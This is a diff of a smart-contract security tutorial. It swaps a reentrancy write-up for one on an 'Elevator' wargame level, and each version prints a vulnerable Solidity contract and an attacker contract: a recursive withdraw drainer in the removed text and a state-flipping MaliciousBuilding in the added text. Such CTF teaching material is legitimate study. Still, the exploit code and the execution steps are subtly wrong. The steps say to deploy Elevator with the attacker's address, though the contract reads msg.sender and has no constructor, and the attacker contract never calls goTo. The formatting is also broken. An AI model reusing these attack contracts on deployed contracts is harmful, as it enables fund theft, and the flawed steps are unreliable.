@@ -1,79 +1,61 @@
-# Understanding Reentrancy in Solidity Smart Contracts
+# Understanding Trust Issues in Smart Contracts: A Case of Elevator Vulnerability
 
-Reentrancy is a critical concept in the realm of blockchain security, particularly when it comes to auditing and securing smart contracts. Mastering this concept can unlock numerous insights and strategies for ensuring the robustness and safety of decentralized applications (DApps).
+In the realm of blockchain development, there's a fundamental principle: "Never trust functions that can change the state of a variable or return different outputs during different executions." This principle is essential for ensuring the security and integrity of smart contracts.
 
-## What is Reentrancy?
+## The Vulnerable Contract
 
-Reentrancy refers to the ability of a contract to call back into itself or another contract while it is still executing. This characteristic can lead to unexpected behaviors and vulnerabilities if not handled properly. In Solidity smart contracts, reentrancy bugs are particularly concerning as they can enable malicious actors to exploit vulnerabilities and drain funds from contracts.
-
-## Exploring a Target Contract
-
-Consider the following Solidity smart contract:
+Consider the following Solidity contract:
 
     ```solidity
     // SPDX-License-Identifier: MIT
-    pragma solidity ^0.6.12;
+    pragma solidity ^0.8.0;
     
-    import 'openzeppelin-contracts-06/math/SafeMath.sol';
+    interface Building {
+      function isLastFloor(uint) external returns (bool);
+    }
     
-    contract Reentrance {
-      
-      using SafeMath for uint256;
-      mapping(address => uint) public balances;
+    contract Elevator {
+      bool public top;
+      uint public floor;
     
-      function donate(address _to) public payable {
-        balances[_to] = balances[_to].add(msg.value);
-      }
+      function goTo(uint _floor) public {
+        Building building = Building(msg.sender);
     
-      function balanceOf(address _who) public view returns (uint balance) {
-        return balances[_who];
-      }
-    
-      function withdraw(uint _amount) public {
-        if(balances[msg.sender] >= _amount) {
-          (bool result,) = msg.sender.call{value:_amount}("");
-          if(result) {
-            _amount;
-          }
-          balances[msg.sender] -= _amount;
+        if (! building.isLastFloor(_floor)) {
+          floor = _floor;
+          top = building.isLastFloor(floor);
         }
       }
-    
-      receive() external payable {}
     }
 
-    
-This contract allows users to donate funds, check their balances, and withdraw funds. However, it contains a vulnerability related to reentrancy in the withdraw function.
+This contract represents an elevator system where the goTo function allows users to move to different floors. The contract interacts with an external contract (Building) through the isLastFloor function to determine if the current floor is the top floor.
 
-Exploiting Reentrancy
-To exploit the reentrancy vulnerability in the withdraw function, we can create a malicious contract that calls the withdraw function of the target contract and has a fallback function that gets triggered during the withdrawal process. This fallback function can then recursively call the withdraw function, allowing it to repeatedly drain funds from the target contract.
-
+## Exploiting the Vulnerability
+The vulnerability lies in the reliance on an external contract to determine whether the current floor is the top floor. An attacker can exploit this vulnerability by implementing a malicious contract that manipulates the behavior of the isLastFloor function.
 
 Here's an example of an exploit contract:
 
-
     ```solidity
-    contract MaliciousContract {
-        Reentrance private targetContract;
-    
-        constructor(address _targetContract) public {
-            targetContract = Reentrance(_targetContract);
+    contract MaliciousBuilding is Building {
+    bool private isFirstIteration = true;
+
+    function isLastFloor(uint) external override returns (bool) {
+        if (isFirstIteration) {
+            isFirstIteration = false;
+            return false;
+        } else {
+            return true;
         }
-    
-        function attack() public payable {
-            targetContract.withdraw(msg.value);
-        }
-    
-        fallback() external payable {
-            if (address(targetContract).balance >= msg.value) {
-                targetContract.withdraw(msg.value);
-            }
-        }
+      }
     }
+    
+## Exploit Execution
+To execute the exploit and pass this level, follow these steps:
 
+## Deploy the MaliciousBuilding contract.
+Deploy the Elevator contract, passing the address of the MaliciousBuilding contract as the Building interface.
+Call the goTo function of the Elevator contract with any floor number.
+During the first iteration, the isLastFloor function will return false, causing the top variable to remain false. However, during the second iteration, the function will return true, tricking the Elevator contract into believing it has reached the top floor, thus exploiting the vulnerability.
 
-In this exploit contract, the attack function initiates the reentrancy attack by calling the withdraw function of the target contract (Reentrance). Additionally, the fallback function is triggered during the withdrawal process, allowing for recursive calls to the withdraw function.
-
-### Conclusion
-Understanding reentrancy vulnerabilities and how they can be exploited is crucial for ensuring the security of smart contracts on blockchain platforms. By identifying and addressing such vulnerabilities, developers can build more robust and resilient decentralized applications, protecting users' funds and maintaining trust in the ecosystem.
-
+## Conclusion
+This case highlights the importance of robust contract design and the need for cautiousness when interacting with external contracts. By adhering to best practices and thoroughly auditing smart contracts, developers can mitigate the risk of vulnerabilities and safeguard decentralized systems against potential exploits.
